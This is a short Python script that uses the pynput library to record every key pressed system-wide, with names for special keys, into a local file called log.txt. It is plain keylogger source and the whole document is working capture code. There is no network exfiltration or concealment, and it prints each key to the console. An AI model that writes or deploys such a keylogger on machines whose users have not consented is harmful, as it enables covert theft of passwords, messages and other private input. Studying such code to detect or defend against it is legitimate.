from pynput import keyboard

file = open("log.txt", "r")
content = file.readlines()

def on_press(key):
    try:
        print(str(key.char)+" pressed")
        content.append(str(key.char)+"\n")
        file = open("log.txt", "w")
        file.writelines(content)
    except AttributeError:
        if str(key) == "Key.backspace":
            content.append("Backspace\n")
            file = open("log.txt", "w")
            file.writelines(content)
        elif str(key) == "Key.space":
            content.append("Space\n")
            file = open("log.txt", "w")
            file.writelines(content)
        elif str(key) == "Key.ctrl_l":
            content.append("Left CTRL\n")
            file = open("log.txt", "w")
            file.writelines(content)
        elif str(key) == "Key.shift":
            content.append("Left Shift\n")
            file = open("log.txt", "w")
            file.writelines(content)
        elif str(key) == "Key.enter":
            content.append("Enter\n")
            file = open("log.txt", "w")
            file.writelines(content)
        elif str(key) == "Key.shift_r":
            content.append("Right Shift\n")
            file = open("log.txt", "w")
            file.writelines(content)
        elif str(key) == "Key.alt_l":
            content.append("Left ALT\n")
            file = open("log.txt", "w")
            file.writelines(content)
        elif str(key) == "Key.alt_gr":
            content.append("ALT GR\n")
            file = open("log.txt", "w")
            file.writelines(content)
        elif str(key) == "Key.left":
            content.append("Left Arrow\n")
            file = open("log.txt", "w")
            file.writelines(content)
        elif str(key) == "Key.right":
            content.append("Right Arrow\n")
            file = open("log.txt", "w")
            file.writelines(content)
        elif str(key) == "Key.up":
            content.append("Up Arrow\n")
            file = open("log.txt", "w")
            file.writelines(content)
        elif str(key) == "Key.down":
            content.append("Down Arrow\n")
            file = open("log.txt", "w")
            file.writelines(content)
        elif str(key) == "Key.cmd":
            content.append("Windows Button\n")
            file = open("log.txt", "w")
            file.writelines(content)
        elif str(key) == "Key.caps_lock":
            content.append("Caps Lock\n")
            file = open("log.txt", "w")
            file.writelines(content)
        else:
            content.append(str(key)+"\n")
            file = open("log.txt", "w")
            file.writelines(content)

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()

